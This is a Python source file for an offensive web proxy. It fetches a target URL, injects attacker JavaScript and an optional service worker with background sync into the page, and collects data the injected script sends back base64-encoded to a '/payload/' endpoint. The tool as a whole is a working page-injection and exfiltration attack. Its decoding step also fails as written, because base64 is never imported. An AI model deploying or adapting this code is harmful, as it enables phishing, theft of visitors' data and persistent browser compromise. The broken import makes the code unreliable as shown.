from http.server import BaseHTTPRequestHandler, HTTPServer
from functools import partial
from urllib.request import urlopen
from bs4 import BeautifulSoup

class injectionHandler(BaseHTTPRequestHandler):
	payload = ""
	url = ""
	worker = ""
	def __init__(self, payload, worker, url, *args, **kwargs):
		self.payload = str(payload)
		self.worker = str(worker)
		self.url = str(url)

		#print ("PayLoad=" + str(self.payload) + " - Worker=" + str(self.worker) + " - URL=" + str(self.url))

		super().__init__(*args, **kwargs)

	def inject(self,content):
		payload=""
		payloadFunctions = """
		function sendPayload(payload){
			var xhr = new XMLHttpRequest(); 
			payload = btoa(payload);
			xhr.open('GET', '/payload/' + payload , true);
			xhr.send();

		}
		"""
		if (self.worker != "None"):
			payloadFunctions += """
		
		// Service Worker code
			if ('serviceWorker' in navigator) {
				navigator.serviceWorker.register('/sw.js').then((registration) => {
				return navigator.serviceWorker.ready;
				}).then((registration) => {
				// register sync
				
					registration.sync.register('backgroundSync').then(() => {
					console.log('sync registered');
					}).catch(function(error){
					console.log('Unable to fetch image.');
					});
				
				}).catch(function(error){
					console.log('Unable to register Service Worker.');
				});
			}
			else{
			console.log('Service Worker functionality not supported.');
			}

			"""
		if (self.payload != "None"):
			payload = open("payloads/" + self.payload + ".js",'r').read()

		html = BeautifulSoup(content,features="html.parser")
		if html.body:
			script = html.new_tag(
				"script",				
				type='application/javascript')
			script.string=payloadFunctions + payload
			#html.body.insert(0, script)
			html.body.append(script)
			return str(html).encode()

	def end_headers (self):
		self.send_header('Access-Control-Allow-Origin', '*')
		BaseHTTPRequestHandler.end_headers(self)

	def do_GET(self):
		if self.path.startswith("/payload/"):
			self.send_response(200)
			self.end_headers()
			encPayload = str(self.path.split('/')[2])
			decPayload = str(base64.b64decode(encPayload), "utf-8")
			print ("RECEIVED PAYLOAD: \n" + decPayload)			
			return

		if self.path.startswith("/sw.js"):
			self.send_response(200)
			self.send_header('Content-type','application/javascript')
			self.end_headers()
			self.wfile.write(open("workers/" + self.worker + ".js",'r').read().encode())			
			return

		# Grabbing requeste headers
		#print("Request from " + str(self.client_address) + ", User Agent: " + str(self.headers["User-Agent"]))

		self.send_response(200)		
		self.send_header('Content-type','text/html')
		self.end_headers()
		self.wfile.write(self.inject(urlopen(self.url).read()))
		return
		
	def log_message(self, format, *args):
		return


def startServer(url, port, payload, worker):
	try:
		#Create a web server and define the handler to manage the incoming request
		handler = partial(injectionHandler,payload, worker, url)
		server = HTTPServer(('', port), handler)
		print ('Started local server on http://127.0.0.1:' + str(port))
		server.serve_forever()

	except KeyboardInterrupt:
		print ('^C received, shutting down the web server')
		server.socket.close()
